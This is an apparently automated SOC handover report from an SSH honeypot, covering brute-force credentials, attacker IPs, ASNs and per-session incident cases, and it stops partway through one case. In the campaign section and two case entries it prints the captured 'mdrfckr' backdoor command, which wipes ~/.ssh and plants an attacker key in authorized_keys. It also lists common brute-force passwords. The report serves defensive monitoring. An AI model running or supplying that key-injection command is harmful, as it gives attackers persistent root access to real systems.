# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T11:00:52Z |
| **Shift Time** | 11:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **96** |
| Confirmed Threats | **93** |
| False Positives Filtered | **3** (3.1%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **18** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **75** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **83** |
| Unique Credential Pairs | **80** |
| Unique Usernames | **45** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `Ubnt` | 3 |
| `oracle` | 3 |
| `nobody` | 2 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 10 |
| `abc123` | 3 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `maintenance` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `Admin` | `maintenance` | 2 |
| `default` | `default2001` | 1 |
| `nobody` | `5555` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456abc` | `172.174.17.234` | 2026-03-30T09:38:13 |
| `root` | `3245gs5662d34` | `172.174.17.234` | 2026-03-30T09:38:21 |
| `root` | `Root#2026` | `78.100.64.148` | 2026-03-30T09:49:17 |
| `root` | `3245gs5662d34` | `78.100.64.148` | 2026-03-30T09:49:19 |
| `root` | `!Q2w3e4r` | `197.156.67.84` | 2026-03-30T10:48:17 |
| `root` | `aA123456` | `197.156.67.84` | 2026-03-30T10:50:17 |
| `root` | `P@ssw0rd` | `197.156.67.84` | 2026-03-30T10:51:04 |
| `root` | `!qaz@WSX` | `197.156.67.84` | 2026-03-30T10:51:16 |
| `root` | `Aa123456` | `197.156.67.84` | 2026-03-30T10:52:51 |
| `root` | `abc123` | `197.156.67.84` | 2026-03-30T10:53:15 |
| `root` | `p@ssword` | `197.156.67.84` | 2026-03-30T10:53:39 |
| `root` | `Ab123456` | `197.156.67.84` | 2026-03-30T10:54:02 |
| `root` | `1qaz@wsx` | `197.156.67.84` | 2026-03-30T10:54:26 |
| `root` | `P@ssword` | `197.156.67.84` | 2026-03-30T10:54:38 |
| `root` | `qQ123456` | `197.156.67.84` | 2026-03-30T10:55:02 |
| `root` | `password` | `197.156.67.84` | 2026-03-30T10:55:37 |
| `root` | `Pa$$w0rd` | `197.156.67.84` | 2026-03-30T10:56:13 |
| `root` | `4r3e2w1q` | `197.156.67.84` | 2026-03-30T10:57:12 |
| `root` | `admin` | `197.156.67.84` | 2026-03-30T10:58:36 |
| `root` | `1` | `197.156.67.84` | 2026-03-30T10:59:11 |
| `root` | `qwerty123` | `197.156.67.84` | 2026-03-30T10:59:35 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `78.100.64.148`, `172.174.17.234`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **28** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS63526` | Systems Solutions & development Technologies Limited | 1 | HIGH |
| `AS56047` | China Mobile communications corporation | 1 | HIGH |
| `AS10099` | China Unicom Global | 1 | HIGH |
| `AS30844` | Liquid Telecommunications Ltd | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a393e174cd6

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-03-30 09:38 |
| **Last Seen** | 2026-03-30 09:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 09:38:12` | `cowrie.session.connect` |
| `2026-03-30 09:38:12` | `cowrie.client.version` |
| `2026-03-30 09:38:12` | `cowrie.client.kex` |
| `2026-03-30 09:38:13` | `cowrie.login.success` |
| `2026-03-30 09:38:14` | `cowrie.session.params` |
| `2026-03-30 09:38:14` | `cowrie.command.input` |
| `2026-03-30 09:38:14` | `cowrie.command.failed` |
| `2026-03-30 09:38:14` | `cowrie.log.closed` |
| `2026-03-30 09:38:14` | `cowrie.session.params` |
| `2026-03-30 09:38:14` | `cowrie.command.input` |
| `2026-03-30 09:38:15` | `cowrie.session.file_download` |
| `2026-03-30 09:38:15` | `cowrie.log.closed` |
| `2026-03-30 09:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76abafbb8760

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-03-30 09:38 |
| **Last Seen** | 2026-03-30 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 09:38:20` | `cowrie.session.connect` |
| `2026-03-30 09:38:20` | `cowrie.client.version` |
| `2026-03-30 09:38:20` | `cowrie.client.kex` |
| `2026-03-30 09:38:21` | `cowrie.login.success` |
| `2026-03-30 09:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2553c9b762e

| Field | Detail |
|---|---|
| **Source IP** | `78.100.64[.]148` |
| **First Seen** | 2026-03-30 09:49 |
| **Last Seen** | 2026-03-30 09:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 09:49:16` | `cowrie.session.connect` |
| `2026-03-30 09:49:16` | `cowrie.client.version` |
| `2026-03-30 09:49:16` | `cowrie.client.kex` |
| `2026-03-30 09:49:17` | `cowrie.login.success` |
| `2026-03-30 09:49:17` | `cowrie.session.params` |
| `2026-03-30 09:49:17` | `cowrie.command.input` |
| `2026-03-30 09:49:17` | `cowrie.command.failed` |
| `2026-03-30 09:49:17` | `cowrie.log.closed` |
| `2026-03-30 09:49:17` | `cowrie.session.params` |
| `2026-03-30 09:49:17` | `cowrie.command.input` |
| `2026-03-30 09:49:17` | `cowrie.session.file_download` |
| `2026-03-30 09:49:17` | `cowrie.log.closed` |
| `2026-03-30 09:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.100.64[.]148` to AbuseIPDB if not already reported
- [ ] Block `78.100.64[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d5b9514e23

| Field | Detail |
|---|---|
| **Source IP** | `78.100.64[.]148` |
| **First Seen** | 2026-03-30 09:49 |
| **Last Seen** | 2026-03-30 09:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 09:49:18` | `cowrie.session.connect` |
| `2026-03-30 09:49:18` | `cowrie.client.version` |
| `2026-03-30 09:49:18` | `cowrie.client.kex` |
| `2026-03-30 09:49:19` | `cowrie.login.success` |
| `2026-03-30 09:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.100.64[.]148` to AbuseIPDB if not already reported
- [ ] Block `78.100.64[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b605f77d9899

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:48 |
| **Last Seen** | 2026-03-30 10:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:48:17` | `cowrie.session.connect` |
| `2026-03-30 10:48:17` | `cowrie.client.version` |
| `2026-03-30 10:48:17` | `cowrie.client.kex` |
| `2026-03-30 10:48:17` | `cowrie.login.success` |
| `2026-03-30 10:48:17` | `cowrie.session.params` |
| `2026-03-30 10:48:17` | `cowrie.command.input` |
| `2026-03-30 10:48:18` | `cowrie.log.closed` |
| `2026-03-30 10:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1cb28cb9ab

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:50 |
| **Last Seen** | 2026-03-30 10:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:50:16` | `cowrie.session.connect` |
| `2026-03-30 10:50:16` | `cowrie.client.version` |
| `2026-03-30 10:50:16` | `cowrie.client.kex` |
| `2026-03-30 10:50:17` | `cowrie.login.success` |
| `2026-03-30 10:50:17` | `cowrie.session.params` |
| `2026-03-30 10:50:17` | `cowrie.command.input` |
| `2026-03-30 10:50:17` | `cowrie.log.closed` |
| `2026-03-30 10:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef54d12094cb

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:51 |
| **Last Seen** | 2026-03-30 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:51:03` | `cowrie.session.connect` |
| `2026-03-30 10:51:03` | `cowrie.client.version` |
| `2026-03-30 10:51:03` | `cowrie.client.kex` |
| `2026-03-30 10:51:04` | `cowrie.login.success` |
| `2026-03-30 10:51:04` | `cowrie.session.params` |
| `2026-03-30 10:51:04` | `cowrie.command.input` |
| `2026-03-30 10:51:05` | `cowrie.log.closed` |
| `2026-03-30 10:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff1478691147

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:51 |
| **Last Seen** | 2026-03-30 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:51:15` | `cowrie.session.connect` |
| `2026-03-30 10:51:15` | `cowrie.client.version` |
| `2026-03-30 10:51:15` | `cowrie.client.kex` |
| `2026-03-30 10:51:16` | `cowrie.login.success` |
| `2026-03-30 10:51:16` | `cowrie.session.params` |
| `2026-03-30 10:51:16` | `cowrie.command.input` |
| `2026-03-30 10:51:17` | `cowrie.log.closed` |
| `2026-03-30 10:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4235990e2a

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:52 |
| **Last Seen** | 2026-03-30 10:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:52:50` | `cowrie.session.connect` |
| `2026-03-30 10:52:50` | `cowrie.client.version` |
| `2026-03-30 10:52:50` | `cowrie.client.kex` |
| `2026-03-30 10:52:51` | `cowrie.login.success` |
| `2026-03-30 10:52:51` | `cowrie.session.params` |
| `2026-03-30 10:52:51` | `cowrie.command.input` |
| `2026-03-30 10:52:52` | `cowrie.log.closed` |
| `2026-03-30 10:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f155576f81e3

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:53 |
| **Last Seen** | 2026-03-30 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:53:14` | `cowrie.session.connect` |
| `2026-03-30 10:53:14` | `cowrie.client.version` |
| `2026-03-30 10:53:14` | `cowrie.client.kex` |
| `2026-03-30 10:53:15` | `cowrie.login.success` |
| `2026-03-30 10:53:15` | `cowrie.session.params` |
| `2026-03-30 10:53:15` | `cowrie.command.input` |
| `2026-03-30 10:53:15` | `cowrie.log.closed` |
| `2026-03-30 10:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cb17c8fe0ca

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:53 |
| **Last Seen** | 2026-03-30 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:53:38` | `cowrie.session.connect` |
| `2026-03-30 10:53:38` | `cowrie.client.version` |
| `2026-03-30 10:53:38` | `cowrie.client.kex` |
| `2026-03-30 10:53:39` | `cowrie.login.success` |
| `2026-03-30 10:53:39` | `cowrie.session.params` |
| `2026-03-30 10:53:39` | `cowrie.command.input` |
| `2026-03-30 10:53:39` | `cowrie.log.closed` |
| `2026-03-30 10:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88fc093a0156

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:54 |
| **Last Seen** | 2026-03-30 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:54:01` | `cowrie.session.connect` |
| `2026-03-30 10:54:01` | `cowrie.client.version` |
| `2026-03-30 10:54:02` | `cowrie.client.kex` |
| `2026-03-30 10:54:02` | `cowrie.login.success` |
| `2026-03-30 10:54:03` | `cowrie.session.params` |
| `2026-03-30 10:54:03` | `cowrie.command.input` |
| `2026-03-30 10:54:03` | `cowrie.log.closed` |
| `2026-03-30 10:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08bc52fbad59

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:54 |
| **Last Seen** | 2026-03-30 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:54:25` | `cowrie.session.connect` |
| `2026-03-30 10:54:25` | `cowrie.client.version` |
| `2026-03-30 10:54:25` | `cowrie.client.kex` |
| `2026-03-30 10:54:26` | `cowrie.login.success` |
| `2026-03-30 10:54:27` | `cowrie.session.params` |
| `2026-03-30 10:54:27` | `cowrie.command.input` |
| `2026-03-30 10:54:27` | `cowrie.log.closed` |
| `2026-03-30 10:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0cc3119b65

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:54 |
| **Last Seen** | 2026-03-30 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:54:37` | `cowrie.session.connect` |
| `2026-03-30 10:54:37` | `cowrie.client.version` |
| `2026-03-30 10:54:37` | `cowrie.client.kex` |
| `2026-03-30 10:54:38` | `cowrie.login.success` |
| `2026-03-30 10:54:38` | `cowrie.session.params` |
| `2026-03-30 10:54:38` | `cowrie.command.input` |
| `2026-03-30 10:54:38` | `cowrie.log.closed` |
| `2026-03-30 10:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9bdbc98cc86

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:55 |
| **Last Seen** | 2026-03-30 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:55:01` | `cowrie.session.connect` |
| `2026-03-30 10:55:01` | `cowrie.client.version` |
| `2026-03-30 10:55:01` | `cowrie.client.kex` |
| `2026-03-30 10:55:02` | `cowrie.login.success` |
| `2026-03-30 10:55:02` | `cowrie.session.params` |
| `2026-03-30 10:55:02` | `cowrie.command.input` |
| `2026-03-30 10:55:02` | `cowrie.log.closed` |
| `2026-03-30 10:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dcbfe951e0f

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:55 |
| **Last Seen** | 2026-03-30 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:55:36` | `cowrie.session.connect` |
| `2026-03-30 10:55:36` | `cowrie.client.version` |
| `2026-03-30 10:55:37` | `cowrie.client.kex` |
| `2026-03-30 10:55:37` | `cowrie.login.success` |
| `2026-03-30 10:55:37` | `cowrie.session.params` |
| `2026-03-30 10:55:37` | `cowrie.command.input` |
| `2026-03-30 10:55:37` | `cowrie.log.closed` |
| `2026-03-30 10:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4324f20b036c

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:56 |
| **Last Seen** | 2026-03-30 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:56:12` | `cowrie.session.connect` |
| `2026-03-30 10:56:12` | `cowrie.client.version` |
| `2026-03-30 10:56:12` | `cowrie.client.kex` |
| `2026-03-30 10:56:13` | `cowrie.login.success` |
| `2026-03-30 10:56:13` | `cowrie.session.params` |
| `2026-03-30 10:56:13` | `cowrie.command.input` |
| `2026-03-30 10:56:13` | `cowrie.log.closed` |
| `2026-03-30 10:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0f2815cffc

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:57 |
| **Last Seen** | 2026-03-30 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:57:12` | `cowrie.session.connect` |
| `2026-03-30 10:57:12` | `cowrie.client.version` |
| `2026-03-30 10:57:12` | `cowrie.client.kex` |
| `2026-03-30 10:57:12` | `cowrie.login.success` |
| `2026-03-30 10:57:13` | `cowrie.session.params` |
| `2026-03-30 10:57:13` | `cowrie.command.input` |
| `2026-03-30 10:57:13` | `cowrie.log.closed` |
| `2026-03-30 10:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e338590d8bd

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:58 |
| **Last Seen** | 2026-03-30 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:58:35` | `cowrie.session.connect` |
| `2026-03-30 10:58:35` | `cowrie.client.version` |
| `2026-03-30 10:58:35` | `cowrie.client.kex` |
| `2026-03-30 10:58:36` | `cowrie.login.success` |
| `2026-03-30 10:58:36` | `cowrie.session.params` |
